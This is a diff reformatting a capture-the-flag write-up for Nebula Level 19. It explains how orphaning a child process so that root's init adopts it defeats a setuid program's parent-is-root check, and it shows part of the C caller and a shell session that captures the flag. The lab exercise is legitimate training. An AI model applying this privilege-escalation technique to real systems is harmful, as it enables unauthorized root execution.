@@ -545,51 +545,18 @@ You have successfully executed getflag on a target account
 ```
 
 ## Level 19
-This presents a program that executes a command only if its parent is the root process.  We can start flag19 binary from another process, then terminate the calling parent process before execve() in the child, without waiting for it, so the child becomes 'orphan'. An orphan process is a process whose parent process has finished or terminated, though it remains running itself. In a Unix-like operating system any orphaned process will be immediately adopted by the special init system process. This operation is called re-parenting and occurs automatically. The init process is started under the root username.
+This presents a program that executes a command only if its parent is the root process.  We can start _`flag19`_ binary from another process, then terminate the calling parent process before _`execve()`_ in the child, without waiting for it, so the child becomes 'orphan'. [An orphan process](https://en.wikipedia.org/wiki/Orphan_process) is a process whose parent process has finished or terminated, though it remains running itself. In a Unix-like operating system any orphaned process will be immediately adopted by the special init system process. This operation is called re-parenting and occurs automatically. The init process is started under the root username.
 Source of the calling process:
-?
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
+```c
 /* 
-Credit: http://chrismeyers.org/2012/05/01/nebula-level-19/
- */
-#include <unistd.h>     /* Symbolic Constants */
-#include <sys types.h="">  /* Primitive System Data Types */
-#include <errno.h>      /* Errors */
-#include <stdio.h>      /* Input/Output */
+    Credit: http://chrismeyers.org/2012/05/01/nebula-level-19/
+*/
+#include <unistd.h>        /* Symbolic Constants 	   */
+#include <sys types.h="">  /* Primitive System Data Types  */
+#include <errno.h>         /* Errors 			   */
+#include <stdio.h>         /* Input/Output 		   */
 #include <sys wait.h="">   /* Wait for Process Termination */
-#include <stdlib.h>     /* General Utilities */
+#include <stdlib.h>        /* General Utilities   	   */
  
 int main() {
     pid_t childpid; /* variable to store the child's pid */
@@ -613,20 +580,17 @@ int main() {
         }
     }
 }
-</stdlib.h></sys></stdio.h></errno.h></sys></unistd.h>
-Executing it: 
-?
-1
-2
-3
-4
-5
-6
+```
+
+And let's execute it: 
+```bash
 level19@nebula:~$ ps aux | grep -i init
 root         1  0.0  0.7   3188  1772 ?        Ss   Jul13   0:03 /sbin/init
 level19@nebula:~$ gcc start.c
 level19@nebula:~$ ./a.out
 level19@nebula:~$ cat /home/flag19/test
 You have successfully executed getflag on a target account
+```
 
-All the levels are very instructive, heading for the next ones in Protostar.
+## Conclusion
+All the levels are very instructive, I've enjoyed them alot and wanted to thank the authors for the challenge. Now heading for the [Protostar](https://exploit-exercises.com/protostar/).
